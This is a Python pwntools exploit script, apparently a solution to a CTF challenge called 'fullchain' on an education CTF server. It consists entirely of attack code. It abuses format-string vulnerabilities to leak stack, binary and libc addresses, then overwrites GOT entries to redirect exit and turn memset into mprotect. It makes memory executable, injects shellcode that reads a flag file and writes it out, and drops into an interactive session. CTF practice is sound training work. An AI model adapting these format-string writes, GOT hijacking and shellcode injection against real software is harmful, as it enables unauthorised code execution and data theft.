#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 30201)

def _set_loc(loc):
    r.sendlineafter('global or local > ', loc)

def _set(data, _len):
    r.sendlineafter('set, read or write > ', 'set')
    r.sendlineafter('data > ', str(data))
    r.sendlineafter('length > ', str(_len))

def _set_opt(opt):
    r.sendlineafter('set, read or write > ', opt)

### leak stack ###
### r1 ###
_set_loc('local')
_set_opt('write%10$p')
r.recvuntil('write')
stack = int(r.recv(14), 16)
cnt = stack - 0x2c
ptr = stack - 0x28
info(f"stack: {hex(stack)}")
info(f"cnt: {hex(cnt)}")
info(f"ptr: {hex(ptr)}")

### r2 ###
_set_loc('local')
_set_opt('read')
r.sendline(b'\xAA'*0x10 + p64(cnt)[:-1])

### r3 ###
_set_loc('local')
_set_opt('write%16$n') # overwrite cnt to 5

### overwrite cnt to large value ###
_set_loc('local')
_set_opt('read')
r.sendline(b'\xBB'*0x10 + p64(cnt)[:-1])

_set_loc('global')
_set_opt('read')
r.sendline(b'write%1000c%16$hn')

_set_loc('global')
_set_opt('write') # overwrite cnt

### leak code ###
_set_loc('local')
_set_opt('write%11$p')
r.recvuntil('write')
code = int(r.recv(14), 16) - 0x172d
_global = code + 0x40b0
exit_got = code + 0x4070
memset_got = code + 0x4058
printf_got = code + 0x4040
info(f"code: {hex(code)}")

### overwrite exit_got ###
_set_loc('local')
_set_opt('read')
r.sendline(b'\xCC'*0x10 + p64(exit_got)[:-1])

_set_loc('global')
_set_opt('read')
r.sendline(b'write%21c%16$hhn')

_set_loc('global')
_set_opt('write')

### overwrite ptr to memset_got to leak + write mprotect address ###
_set_loc('local')
_set(0xAA, 0x10)

_set_loc('local')
_set_opt('read')
r.sendline(b'\xDD'*0x10 + p64(ptr)[:-1])

_set_loc('global')
_set_opt('read')
r.sendline(b'write%83c%16$hhn') # ptr: global --> printf_got

_set_loc('global')
_set_opt('write')

_set_loc('owo')
_set_opt('write')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x18ea90
# libc = u64(r.recv(6).ljust(8, b'\x00')) - 0xbf070
# libc = u64(r.recv(6).ljust(8, b'\x00'))
mprotect = libc + 0x11bb00
info(f"libc: {hex(libc)}")
input()

_set_loc('owo')
_set_opt('read')
r.sendline(p64(mprotect)) # memset --> mprotect

### overwrite ptr to page align and call memset to make page rwx ###
_set_loc('local')
_set_opt('read')
r.sendline(b'\xEE'*0x10 + p64(ptr)[:-1])

_set_loc('global')
_set_opt('read')
r.sendline(b'write%251c%16$hhn') # global --> page alignment

_set_loc('global')
_set_opt('write')

_set_loc('owo')
_set(0x1000, 7)

### overwrite exit_got to global ###
_set_loc('local')
_set_opt('read')
r.sendline(b'\xFF'*0x10 + p64(exit_got)[:-1])
_set_loc('global')
_set_opt('read')
r.sendline(f'write%{  (_global & 0xffff) - 5  }c%16$hn')

_set_loc('global')
_set_opt('write')

# read(0, global, 0x80)
sc = asm("""
xor rax, rax
xor rdi, rdi
lea rsi, [rip]
mov rdx, 0x100
syscall
""")

# open("/home/fullchain/flag", 0)
# read(3, buf, 0x40)
# write(1, buf, 0x40)
sc2 = asm(f"""
mov rax, 0x67616c66
push rax
mov rax, 0x2f6e696168636c6c
push rax
mov rax, 0x75662f656d6f682f
push rax
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, {_global}
mov rdx, 0x40
mov rax, 0
syscall

mov rdi, 1
mov rax, 1
syscall
""")

### write shellcode to global ###
_set_loc('global')
_set_opt('read')
r.sendline(sc)

_set_loc('owo')
r.sendline(b'\x90'*24 + sc2)

r.interactive()